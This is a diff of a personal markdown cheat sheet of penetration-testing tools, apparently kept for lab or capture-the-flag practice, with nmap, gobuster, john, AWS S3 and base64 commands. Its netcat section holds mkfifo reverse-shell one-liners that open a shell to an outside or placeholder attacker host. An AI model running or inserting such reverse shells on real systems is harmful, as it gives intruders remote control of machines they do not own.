@@ -1,51 +1,55 @@
 ---
-Title: Tools
+Title: Tools Organization
 Description:
 ---
 
+## Content
 
+[***01 - Information Gathering***](#01---information-gathering): [💲Nmap](#nmap) - [💲Netcat (nc)](#netcat-nc)
 
-## Project
++ Live Host Identification: 💲ping
 
-+ [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) \
-  SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.
+[***03 - Web Application Analysis***](#03---web-application-analysis): 📦OWASP ZAP, 📦burpsuite
 
-## CLI Tools
++ Web Crawlers & Directory Bruteforce: [💲gobuster](#gobuster)
 
-### exiftool  
+[***02 - Vulnerability Analysis***](#02---vulnerability-analysis):[📦Nessus](#nessus), 📦Open VAS
 
-```shell
-exiftool XXX.jpg
-```
+[***05 - Password Attacks***](#05---password-attacks): [💲John](#john)
 
-### base64  
++ Online Attacks: 💲hydra
 
-ex: `echo "XXX" | base64 -d`
+[***09 - Sniffing & Spoofing***](#09---sniffing--spoofing): 💲responder, 💲tcpdump, 📦wireshark
 
-### convert ASCII values into ASCII characters  
+[***10 - Post Exploitation***](#10---post-exploitation): 💲evil-winrm
 
-`echo "XXX" | awk '{ printf("%c" ,$0); }'`
+<!-- 
+[***Website Vulnerability Scan***](#website-vulnerability-scan): Acunetix Web Vulnerability Scanner (AWVS)
+***Passive***:
+[***DNS***](#dns): whois, nslookup, host, dig, fierce, DNSenum, DNSrecon, Sublist3r, dnsdumpster
+[***Web Reconnaissance***](#web-reconnaissance): Google Hacking, Google Map, shadon, Recon-ng
+[***Git***](#git): Github/Gitlab, scrabble, GitHack
+[***Email***](#email): theHarvester
+***Active***
+[***Network Service***](#network-service): Netdiscover, Netdiscover
+[***SNMP***](#snmp): Onesixtyone, SNMPwalk
+[***Samba***](#samba): rpcclient, enum4linux
+[***Web***](#web): Nikto, DRIB, Dirbuster, WPScan
+ -->
 
-### [Rockstar](https://codewithrockstar.com/online) \
+[***Storage Service***](#storage-service): [💲AWS-S3](#aws-s3), 💲mysql, 💲redis-cli
 
-Rockstar is a computer programming language designed for creating programs that are also hair metal power ballads.
+[***File & Data***](#filedata): ASCII, 💲base64, 💲[exiftool](#exiftool)
 
-### nc
+[***Useful Repository***](#useful-repository): 📒[SecLists](#seclists)
 
-Netcat is a versatile utility for working with TCP or UDP data.
+## 01 - Information Gathering
 
-``` shell
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.18.0.1 1337 > /tmp/f; rm /tmp/f
-nc -nlvp 1337
-```
+### 💲nmap
 
-+ [Netcat（Linux nc 指令）網路管理者工具實用範例](https://blog.gtwang.org/linux/linux-utility-netcat-examples/)
+<https://nmap.org/>
 
-### hydra
-
-### nmap
-
-+ faster: `sudo nmap --top-ports 3000  -F -sS -sC -sV -n -T4 ${ip}`
+`sudo nmap --top-ports 3000  -F -sS -sC -sV -n -T4 ${ip}`
 
 > -F: Fast mode - Scan fewer ports than the default scan
 >
@@ -64,17 +68,106 @@ nc -nlvp 1337
 >
 > -T4 prohibits the dynamic scan delay from exceeding 10 ms for TCP ports
 
-### gobuster
+#### 💲NetCat (nc)
+
+Netcat is a versatile utility for working with TCP or UDP data.
+
+``` shell
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.18.0.1 1337 > /tmp/f; rm /tmp/f
+nc -nlvp 1337
+
+rm /tmp/f; mkfifo /tmp/f; nc <attack IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+
++ [Netcat（Linux nc 指令）網路管理者工具實用範例](https://blog.gtwang.org/linux/linux-utility-netcat-examples/)
+
+## 02 - Vulnerability Analysis
+
+### 📦Nessus
+
++ [How to Get Started with Nessus on Kali Linux | Tenable®](https://www.tenable.com/blog/getting-started-with-nessus-on-kali-linux)
+
+## 03 - Web Application Analysis
+
+### 💲gobuster
 
 directory/file enumeration mode
 
-+ `gobuster dir --url http://10.129.14.195/ --wordlist ../../tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -x php,html`
++ `gobuster dir --url http://${ip}/ --wordlist ../../tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -x php,html`
 
 VHOST enumeration mode
 
 + `gobuster vhost -w ../../tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb`
 
-### s3
+## 05 - Password Attacks
+
+### 💲john
+
+Password cracker.
+
+`john -w=rockyou.txt hash.txt`
+
+## 09 - Sniffing & Spoofing
+
+## 10 - Post Exploitation
+
+---
+
+<!-- 
+## Website Vulnerability Scan
+## DNS
+## Web Reconnaissance
+## Git
+## Email
+## Other
+## Network Service
+## SNMP
+## Samba
+## Web
+## Reverse Shell
+## Dump Traffic
+ -->
+
+## Storage Service
+
+### 💲AWS-S3
 
 + `aws configure`
 + `aws s3 ls`
+
+## File&Data
+
+### ASCII
+
++ convert ASCII values into ASCII characters: \
+  `echo "65 66 67" | awk '{ for(i=1;i<=NF;i++) printf("%c",$i); print "";  }'`
+
+### 💲base64  
+
+Encode or decode file or standard input to/from Base64, to standard output. \
+More information: <https://www.gnu.org/software/coreutils/base64>.
+
++ Encode the contents of a file as base64 and write the result to stdout: \
+  `base64 filename`
+
++ Decode the base64 contents of a file and write the result to stdout: \
+  `base64 --decode filename`
+
++ Encode from stdin: \
+  `<command> | base64`
+
++ Decode from stdin: \
+  `<command> | base64 --decode`
+
+### 💲exiftool  
+
+Read and write meta information in files. \
+More information: <https://exiftool.org.>.
+
+## Useful Repository
+
+### 📒SecLists
+
+  <https://github.com/danielmiessler/SecLists>
+
+  SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.
